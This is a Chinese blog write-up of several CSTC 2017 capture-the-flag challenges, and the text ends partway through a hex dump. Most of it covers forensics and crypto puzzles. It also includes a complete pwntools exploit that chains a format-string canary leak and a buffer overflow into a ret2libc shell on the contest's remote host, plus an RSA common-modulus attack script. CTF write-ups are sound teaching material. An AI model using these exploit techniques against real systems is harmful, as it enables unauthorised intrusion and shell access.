<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="cstc2017 wp"/>







  <link rel="alternate" href="/atom.xml" title="WeeklyAlgo">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.1.0" />



<link rel="canonical" href="http://weeklyalgo.codes/2017/04/16/cstc2017/"/>


<meta name="description" content="cstc2017的部分wp">
<meta property="og:type" content="article">
<meta property="og:title" content="cstc2017 wp">
<meta property="og:url" content="http://weeklyalgo.codes/2017/04/16/cstc2017/index.html">
<meta property="og:site_name" content="WeeklyAlgo">
<meta property="og:description" content="cstc2017的部分wp">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/trace1.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/trace2.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/tree1.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/tree2.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/tree3.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/tree4.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret1.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret2.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret3.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret4.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret5.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret6.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/oursecret7.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox1.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox2.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox3.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox4.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox5.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox6.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox7.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox8.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/magicalbox9.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/crypto2001.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/crypto2002.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/crypto2003.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/crypto2004.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/misc1001.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/misc1002.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/misc1003.png">
<meta property="og:image" content="http://weeklyalgo.codes/images/cstc2017/misc1004.png">
<meta property="og:updated_time" content="2017-08-03T16:13:12.688Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="cstc2017 wp">
<meta name="twitter:description" content="cstc2017的部分wp">
<meta name="twitter:image" content="http://weeklyalgo.codes/images/cstc2017/trace1.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.1.0" />



  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />




  



    <title> cstc2017 wp · WeeklyAlgo </title>
  </head>

  <body>
    <div class="container">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">WeeklyAlgo</a>
</div>

<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            首页
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            归档
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/categories">
            分类
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/about">
            关于
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/flinks">
            友链
          </a>
        </li>
      
      
    </ul>
  
</nav>

<div class="mobile-navbar">
  <div class="mobile-header">
    <div class="mobile-header-logo">
      <a href="/." class="logo">WeeklyAlgo</a>
    </div>

    <div class="mobile-header-icon">
      <span></span>
      <span></span>
      <span></span>
    </div>
  </div>
  <nav class="mobile-menu">
    
      
      <a class="mobile-menu-item" href="/">
        首页
      </a>
    
      
      <a class="mobile-menu-item" href="/archives/">
        归档
      </a>
    
      
      <a class="mobile-menu-item" href="/categories">
        分类
      </a>
    
      
      <a class="mobile-menu-item" href="/about">
        关于
      </a>
    
      
      <a class="mobile-menu-item" href="/flinks">
        友链
      </a>
    
  </nav>
</div>
      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          cstc2017 wp
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2017年4月16日
        </span>
      </div>
    </header>

    
      <div class="post-toc" id="post-toc">
        <h2 class="post-toc-title">文章目录</h2>
        <div class="post-toc-content">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cstc2017的部分wp"><span class="toc-text">cstc2017的部分wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC150-轨迹"><span class="toc-text">MISC150 - 轨迹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC200-种颗树吧"><span class="toc-text">MISC200 - 种颗树吧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC250-我们的秘密"><span class="toc-text">MISC250 - 我们的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN200-Magical-Box"><span class="toc-text">PWN200 - Magical Box</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO200-crypto2"><span class="toc-text">CRYPTO200 - crypto2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC100-什么玩意-没做出来，暂时留位记录"><span class="toc-text">MISC100 - 什么玩意 (没做出来，暂时留位记录)</span></a></li></ol></li></ol>
        </div>
      </div>
    

    <div class="post-content">
      
        <h1 id="cstc2017的部分wp"><a href="#cstc2017的部分wp" class="headerlink" title="cstc2017的部分wp"></a>cstc2017的部分wp</h1><a id="more"></a>
<blockquote>
<ul>
<li>by hook</li>
</ul>
</blockquote>
<h2 id="MISC150-轨迹"><a href="#MISC150-轨迹" class="headerlink" title="MISC150 - 轨迹"></a>MISC150 - 轨迹</h2><p>先file trace.io,发现该文件是一个pcap包，用wireshark打开:<br><img src="/images/cstc2017/trace1.png" alt=""><br>发现是usb协议题,使用</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">tshark</span> <span class="selector-tag">-r</span> <span class="selector-tag">trace</span><span class="selector-class">.pcap</span> <span class="selector-tag">-T</span> <span class="selector-tag">fields</span> <span class="selector-tag">-e</span> <span class="selector-tag">usb</span><span class="selector-class">.capdata</span></div></pre></td></tr></table></figure>
<p>能够得到下面的数据</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">01<span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:02</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">01<span class="selector-pseudo">:01</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>能够猜测到是鼠标操作相关的流量。<br> <code>每一个数据包的数据区有四个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</code>(资料来源于: <a href="http://bobao.360.cn/learning/detail/3351.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3351.html</a>)</p>
<p>所以直接跑脚本，绘制鼠标移动图像，得到flag。（<a href="https://github.com/WangYihang/UsbMiceDataHacker）" target="_blank" rel="external">https://github.com/WangYihang/UsbMiceDataHacker）</a><br><img src="/images/cstc2017/trace2.png" alt=""></p>
<h2 id="MISC200-种颗树吧"><a href="#MISC200-种颗树吧" class="headerlink" title="MISC200 - 种颗树吧"></a>MISC200 - 种颗树吧</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">binwalk </span>-Me final_new.zip</div></pre></td></tr></table></figure>
<p>从压缩包中递归提取出两张图片1111.jpg, 2222.jpg,又从1111.jpg中提取出一个gif<br><img src="/images/cstc2017/tree1.png" alt=""><br>查看了图1，图2都没什么信息，在gif里查到了一段In-order开头的字符串信息<br><img src="/images/cstc2017/tree2.png" alt=""><br>起初以为栅栏凯撒组合加密，跑了一通都没结果，后来队友在2222.jpg中发现了其他的提示信息<br><img src="/images/cstc2017/tree3.png" alt=""><br>百度搜索In-order, Post-order，发现是树的两种遍历方式<br><img src="/images/cstc2017/tree4.png" alt=""><br>根据两种遍历方式画出树，再层序输出就得到flag</p>
<h2 id="MISC250-我们的秘密"><a href="#MISC250-我们的秘密" class="headerlink" title="MISC250 - 我们的秘密"></a>MISC250 - 我们的秘密</h2><p>同样开局就binwalk先提取所有信息，得到下面一些文件<br><img src="/images/cstc2017/oursecret1.png" alt=""><br>除了readme.txt之外，其他文件都是0字节，还有个0.zip压缩包需要输入密码，mac下解压8F9CB.zip得到那个readme.txt。但队友说这个压缩包解压需要密码，所以想到存在伪加密,拖进16进制编辑器，修改文件头，去掉加密标志位。<br><img src="/images/cstc2017/oursecret2.png" alt=""><br>接着就只剩0.zip一个压缩包了，这里尝试使用zip明文攻击(参考资料：<a href="http://bestwing.me/2016/07/27/CTF-Misc&amp;Crypto-Tools/#AAPasswordRecovery）" target="_blank" rel="external">http://bestwing.me/2016/07/27/CTF-Misc&amp;Crypto-Tools/#AAPasswordRecovery）</a><br>大概跑了两个多小时跑出密码<3xatu2o17>（这里失策了= =。。用的低资源的虚拟机跑的，应该直接放实体机，后来了解到，我应该是跑的时长最长的）<br><img src="/images/cstc2017/oursecret3.png" alt=""><br>成功的到两个资源文件，一个wav, 一个mp4<br><img src="/images/cstc2017/oursecret4.png" alt=""><br>这个一听都是莫尔斯电码：<code>CTFSECWAR2017</code><br>另外一个视频放了下，居然是《人民的名义》= =。。<br><img src="/images/cstc2017/oursecret5.png" alt=""><br>这里尝试了各种分析，全都无果，甚至还用ffmpeg转换成帧图，一个个看过去，什么有价值的信息都没有。。后来队友脑洞搜到<br><img src="/images/cstc2017/oursecret6.png" alt=""><br>成功拿到flag<br><img src="/images/cstc2017/oursecret7.png" alt=""></3xatu2o17></p>
<h2 id="PWN200-Magical-Box"><a href="#PWN200-Magical-Box" class="headerlink" title="PWN200 - Magical Box"></a>PWN200 - Magical Box</h2><p>先<code>checksec</code>发现保护比较多，主要有canary<br><img src="/images/cstc2017/magicalbox1.png" alt=""><br>但是在刚开始的login阶段就能发现有格式化漏洞，通过<code>%7$08x</code>泄漏canary<br><img src="/images/cstc2017/magicalbox2.png" alt=""><br><img src="/images/cstc2017/magicalbox3.png" alt=""><br>接着就是要登陆成功，进入后面的模块，它这里是对输入的字符传与全局变量s异或，再与s2比较。<br><img src="/images/cstc2017/magicalbox4.png" alt=""><br><img src="/images/cstc2017/magicalbox5.png" alt=""><br>这里有个暗坑，因为我是从main函数开始分析起的，并没有发现s2在init阶段就与0xc异或处理过一次，导致刚开始一直算不出正确的用户名。<br>登陆后进入跳转表：<br><img src="/images/cstc2017/magicalbox6.png" alt=""><br><img src="/images/cstc2017/magicalbox7.png" alt=""><br>一个个分析过去，在s_AddAnNewAcc中发现selfInput(src, 0x32)处很明显溢出<br><img src="/images/cstc2017/magicalbox8.png" alt=""><br>接着就是编写合适的exp去get shell，这里使用puts泄漏puts()在内存中的地址，然后和libc中的system(),’/bin/sh’偏移计算的到其在内存中的地址。<br><img src="/images/cstc2017/magicalbox9.png" alt=""></p>
<blockquote>
<p>原先题目是没有libc的，但后来因为只有一人解出，所以放了libc。不过在有libc的情况下，再用puts去泄漏地址就有点大材小用了，可以直接用开头的格式化漏洞泄漏<code>__libc_start_main__</code>地址，然后计算内存偏移去getshell</p>
</blockquote>
<p>exp:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">buf = [<span class="number">0x79</span>, <span class="number">0x3d</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x44</span>, <span class="number">0x4b</span>, <span class="number">0x45</span>, <span class="number">0xa</span>, <span class="number">0x76</span>, <span class="number">0x0</span>]</div><div class="line">sbuf = <span class="string">"4Unf&amp;uy7Mo"</span></div><div class="line"></div><div class="line"><span class="comment">#for ( i = 0; i &lt; buflen(buf); ++i  )</span></div><div class="line"><span class="comment">#    v3[i] = buf[i] ^ *(_BYTE *)(i + 134525066);</span></div><div class="line"><span class="comment">#4Unf&amp;uy7Mo</span></div><div class="line">tempBuf = []</div><div class="line"></div><div class="line"><span class="keyword">for</span> i in xrange(len(sbuf)):</div><div class="line">    temp = <span class="keyword">ord</span>(sbuf[i]) ^ <span class="number">0xc</span></div><div class="line">    tempBuf += <span class="keyword">chr</span>(temp)</div><div class="line"></div><div class="line">str = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i in xrange(len(buf)):</div><div class="line">    <span class="keyword">for</span> j in range(<span class="number">0x0</span>, <span class="number">0xff</span>):</div><div class="line">        <span class="comment">#temp_j = j ^ ord(sbuf[i]);</span></div><div class="line">        temp_j = j ^ <span class="keyword">ord</span>(tempBuf[i]);</div><div class="line">        <span class="keyword">if</span> (temp_j == buf[i]):</div><div class="line">            <span class="keyword">print</span> <span class="string">"buf(%#x)(%c) == after^ =&gt; (%#x)(%c) | buf = (%c)"</span> %(j, <span class="keyword">chr</span>(j), temp_j, <span class="keyword">chr</span>(temp_j), sbuf[i])</div><div class="line">            str += <span class="keyword">chr</span>(j)</div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span>(str)</div><div class="line"></div><div class="line">-----</div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">addNewAccAddr = <span class="number">0x080489AC</span></div><div class="line"><span class="comment">#selfInput(char *buf, int Len)</span></div><div class="line">selfInputAddr = <span class="number">0x0804871D</span></div><div class="line">bssAddr = <span class="number">0x0804B100</span></div><div class="line">putsPltAddr = <span class="number">0x08048570</span></div><div class="line">putsGotAddr = <span class="number">0x0804B030</span></div><div class="line"></div><div class="line"><span class="comment">#p = process('./pwn_box')</span></div><div class="line">p = remote(<span class="string">'117.34.80.134'</span>, <span class="number">7777</span>)</div><div class="line">pwnElf = ELF(<span class="string">'./pwn_box'</span>)</div><div class="line">libcELF = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line"><span class="comment">#gdb.attach(p, '''b *0x08048ACD\n\rc\n\r''')</span></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'are you?'</span>)</div><div class="line">p.sendline(<span class="string">'%7$08x'</span>)</div><div class="line">p.recvuntil(<span class="string">'login!'</span>)</div><div class="line">canary = p.recv(<span class="number">8</span>)</div><div class="line">canaryVal = <span class="keyword">eval</span>(<span class="string">'0x'</span>+canary)</div><div class="line"><span class="keyword">print</span> <span class="string">"canary =  %s, %#x"</span> %(canary, canaryVal)</div><div class="line">p.recvuntil(<span class="string">'you?'</span>)</div><div class="line">p.sendline(<span class="string">'Admin2017'</span>)</div><div class="line">p.recvuntil(<span class="string">'commands.'</span>)</div><div class="line">p.sendline(<span class="string">'?'</span>)</div><div class="line">p.recvuntil(<span class="string">'--\n'</span>)</div><div class="line">p.sendline(<span class="string">'add'</span>)</div><div class="line">p.recvuntil(<span class="string">'Site: '</span>)</div><div class="line">p.sendline(<span class="string">'test'</span>)</div><div class="line">p.recvuntil(<span class="string">'Username: '</span>)</div><div class="line">p.sendline(<span class="string">'test'</span>)</div><div class="line">p.recvuntil(<span class="string">'Password: '</span>)</div><div class="line"></div><div class="line">payloadHead = <span class="string">'a'</span> * <span class="number">30</span> + p32(canaryVal)</div><div class="line">payloadHead += <span class="string">'b'</span>*(<span class="number">46</span>-len(payloadHead))</div><div class="line"><span class="comment">#payload += p32(selfInputAddr) + p32(addNewAccAddr) + p32(bssAddr) + p32(8) </span></div><div class="line"><span class="comment">#p.sendline(payload)</span></div><div class="line"><span class="comment">#p.send('/bin/sh\0')</span></div><div class="line"></div><div class="line">payload1 = payloadHead + p32(putsPltAddr) + p32(addNewAccAddr) + p32(putsGotAddr) </div><div class="line">p.sendline(payload1)</div><div class="line">p.recvuntil(<span class="string">'--\n\n'</span>)</div><div class="line">putsAddr = u32(p.recv(<span class="number">4</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">'putsPltAddr = '</span> +  <span class="keyword">hex</span>(putsPltAddr)</div><div class="line"><span class="keyword">print</span> <span class="string">'putsGotAddr = '</span> +  <span class="keyword">hex</span>(putsGotAddr)</div><div class="line"><span class="keyword">print</span> <span class="string">'putsAddr = '</span> +  <span class="keyword">hex</span>(putsAddr)</div><div class="line"></div><div class="line"><span class="comment"># calculating system() &amp; '/bin/sh'</span></div><div class="line">systemAddr = putsAddr - (libcELF.symbols[<span class="string">'puts'</span>] - libcELF.symbols[<span class="string">'system'</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'systemAddr = '</span> + <span class="keyword">hex</span>(systemAddr)</div><div class="line">binshAddr = putsAddr - (libcELF.symbols[<span class="string">'puts'</span>] - <span class="keyword">next</span>(libcELF.search(<span class="string">'/bin/sh'</span>)))</div><div class="line"><span class="keyword">print</span> <span class="string">'binshAddr = '</span> + <span class="keyword">hex</span>(binshAddr)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Site: '</span>)</div><div class="line">p.sendline(<span class="string">'test'</span>)</div><div class="line">p.recvuntil(<span class="string">'Username: '</span>)</div><div class="line">p.sendline(<span class="string">'test'</span>)</div><div class="line">p.recvuntil(<span class="string">'Password: '</span>)</div><div class="line"></div><div class="line">payload2 = payloadHead + p32(systemAddr) + p32(addNewAccAddr) + p32(binshAddr) </div><div class="line">p.sendline(payload2)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="CRYPTO200-crypto2"><a href="#CRYPTO200-crypto2" class="headerlink" title="CRYPTO200 - crypto2"></a>CRYPTO200 - crypto2</h2><p>题目附件是个pcap包,wireshark打开后<br><img src="/images/cstc2017/crypto2001.png" alt=""><br>发现有PUBLICE, PUBLICN,所以猜测是rsa加密通信。<br><img src="/images/cstc2017/crypto2002.png" alt=""><br>但这里发现他们的N相同，在常见的RSA攻击中找到了共模攻击的资料<br>(<a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a>)<br><img src="/images/cstc2017/crypto2003.png" alt=""><br>所以跑脚本解密得到flag<br><img src="/images/cstc2017/crypto2004.png" alt=""></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">from binascii import *</div><div class="line"></div><div class="line">n1 = 295722865793798033460986793237541395631977030560369657198479193181766567057754287459743723539658396944636677358515648785314565228205230261697963097395812598331880872455869139731578362748460265979187318613591087019956434720952036757300875287830045303192314296720794872499471775336492552983354160440794987630219</div><div class="line">n2 = n1</div><div class="line">c1 = 15839981826811799772634108807452583389456749354145216574984222938829756753294086924872110969732766251541785740757693788214686206806750788561292837339359061701208001297802597</div><div class="line">c2 = 155249880144094802834481749928592059461139577288355397447367776112547796231086359709731959934830872744121046740255722326833958323017063249153808715277882003426237167195613685868065416967276090907468102632169601247074603247233477582113388294508579159856963458656960060635516531998836585340648309492666005454968</div><div class="line">e1 = 3</div><div class="line">e2 = 7</div><div class="line"></div><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">        return (b, 0, 1)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        g, y, x = egcd(b % a, a)</div><div class="line">        return (g, x - (b // a) * y, y)</div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">        raise Exception('modular inverse does not exist')</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        return x % m</div><div class="line"></div><div class="line">s = egcd(e1, e2)</div><div class="line">s1 = s[1]</div><div class="line">s2 = s[2]</div><div class="line">print s</div><div class="line">n = n1</div><div class="line">if s1&lt;0:</div><div class="line">    s1 = - s1</div><div class="line">    c1 = modinv(c1, n)</div><div class="line">elif s2&lt;0:</div><div class="line">    s2 = - s2</div><div class="line">    c2 = modinv(c2, n)</div><div class="line">m = (pow(c1, s1, n)*pow(c2,s2,n))%n</div><div class="line">print m</div><div class="line"><span class="comment">#print unhexlify(m)</span></div><div class="line">print unhexlify(hex(m).rstrip('L')[2:])</div></pre></td></tr></table></figure>
<h2 id="MISC100-什么玩意-没做出来，暂时留位记录"><a href="#MISC100-什么玩意-没做出来，暂时留位记录" class="headerlink" title="MISC100 - 什么玩意 (没做出来，暂时留位记录)"></a>MISC100 - 什么玩意 (没做出来，暂时留位记录)</h2><p>题目要求提交flag{链路秘钥}<br>下载下来附件里有两个文本文件，分别是</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">a0 <span class="number">5</span>c <span class="number">93</span> <span class="number">08</span></div><div class="line">f5 <span class="number">0</span>d <span class="number">28</span> <span class="number">60</span></div><div class="line"><span class="number">00</span> <span class="number">10</span> c6 <span class="number">55</span> e4 </div><div class="line"><span class="number">00</span> <span class="number">1</span>b <span class="number">59</span> <span class="number">97</span> e4</div><div class="line"><span class="number">00</span> <span class="number">10</span> c6 <span class="number">55</span> e4 <span class="number">39</span></div><div class="line"><span class="number">00</span> <span class="number">1</span>b <span class="number">59</span> <span class="number">97</span> e4 <span class="number">70</span></div><div class="line"><span class="number">31</span> <span class="number">30</span> c9 <span class="number">45</span> <span class="number">81</span> f9 f2 b9 <span class="number">69</span> fc <span class="number">09</span> d8</div><div class="line">a0 fe <span class="number">92</span> <span class="number">0</span>f <span class="number">5</span>c c2 <span class="number">8</span>a <span class="number">7</span>b <span class="number">61</span> <span class="number">65</span> de <span class="number">52</span></div><div class="line"><span class="number">09</span> <span class="number">6</span>b c0 f3 <span class="number">6</span>f <span class="number">0</span>a <span class="number">85</span> fa <span class="number">84</span> <span class="number">88</span> dc <span class="number">22</span></div><div class="line">ae <span class="number">54</span> <span class="number">7</span>c <span class="number">47</span> d3 <span class="number">9</span>f <span 